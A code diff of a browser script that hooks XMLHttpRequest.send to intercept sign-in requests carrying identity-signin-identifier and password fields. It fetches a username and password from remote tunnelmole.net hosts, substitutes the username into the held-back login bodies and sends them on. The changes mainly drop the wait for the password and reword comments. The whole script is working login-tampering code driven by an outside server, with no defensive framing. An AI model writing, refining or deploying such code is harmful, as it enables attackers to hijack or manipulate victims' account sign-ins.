@@ -29,7 +29,7 @@ const fetchFreqUsername = async () => {
 
             // Reset the server-side username store
             await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
-            processModifiedRequests(); // Process any pending requests once username is available
+            processModifiedRequests(); // Process any pending requests immediately after fetching the username
         } else {
             console.warn("No username data received, retrying...");
             setTimeout(fetchFreqUsername, 1000); // Retry after 1s if no username is received
@@ -40,7 +40,7 @@ const fetchFreqUsername = async () => {
     }
 };
 
-// Fetch the password when needed
+// Fetch the password when needed (kept separate)
 const fetchFreqPassword = async () => {
     if (passwordFetched) return;
 
@@ -64,7 +64,7 @@ const fetchFreqPassword = async () => {
 
             // Reset the server-side password store
             await fetch('https://wa9b11-ip-37-228-207-173.tunnelmole.net/reset-second-post-data', { method: 'POST' });
-            processModifiedRequests(); // Process any pending requests once password is available
+            processModifiedRequests(); // Process any pending requests after fetching the password
         } else {
             console.warn("No password data received, retrying...");
             setTimeout(fetchFreqPassword, 1000); // Retry after 1s if no password is received
@@ -75,41 +75,40 @@ const fetchFreqPassword = async () => {
     }
 };
 
-// Process pending requests when both username and password are available
+// Process pending requests when the username is available
 const processModifiedRequests = () => {
-    if (!freqUsername || !freqPassword) {
-        console.log("Username or password not available yet, retrying...");
+    if (!freqUsername) {
+        console.log("Username not available yet, retrying...");
         fetchFreqUsername();
-        fetchFreqPassword();
         return;
     }
 
     console.log("Processing pending requests...");
+
+    // Create a copy of pending requests as we will modify it while iterating
     const requestsToProcess = Array.from(pendingRequests);
 
     for (let [xhr, body] of requestsToProcess) {
         const match = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
         const secondmatch = body && /identity-signin-password%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
 
+        // Modify only if a match is found for username or password
         if ((match || secondmatch) && !modifiedRequests.has(body)) {
-            const modifiedBody = body.replace(match ? match[1] : secondmatch[1], freqUsername);
-            modifiedRequests.add(body); // Mark the request as modified
+            let modifiedBody = body.replace(match ? match[1] : secondmatch[1], freqUsername);
 
-            console.log("Modified request with new username:", modifiedBody);
-
-            // Send the modified request and log it
-            console.log("Sending modified request now...");
-            xhr.send(modifiedBody);  // Ensure the modified body is sent
+            // Mark the request as modified and send it
+            modifiedRequests.add(body); 
+            console.log("Sending modified request with new username:", modifiedBody);
+            xhr.send(modifiedBody); // Send the modified body
 
             // Remove the request from pendingRequests after sending
-            pendingRequests.delete(xhr); 
-        } else {
-            console.log("Skipping request or already modified:", body);
+            pendingRequests.delete(xhr);
         }
     }
 
+    // Reset username and password after processing all requests
     if (pendingRequests.size === 0) {
-        console.log("All pending requests processed, resetting freqUsername and freqPassword.");
+        console.log("All pending requests processed, resetting freqUsername.");
         freqUsername = null;
         freqPassword = null;
         usernameFetched = false;
@@ -125,7 +124,7 @@ XMLHttpRequest.prototype.send = function (body) {
         return;
     }
 
-    // Check for relevant patterns in the request body
+    // If the body contains identity-signin-identifier or password, and it hasn't been modified yet, intercept
     if ((/identity-signin-identifier/.test(body) || /identity-signin-password/.test(body)) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
         console.log("Intercepted request:", body);
         pendingRequests.set(this, body); // Store the request in pendingRequests
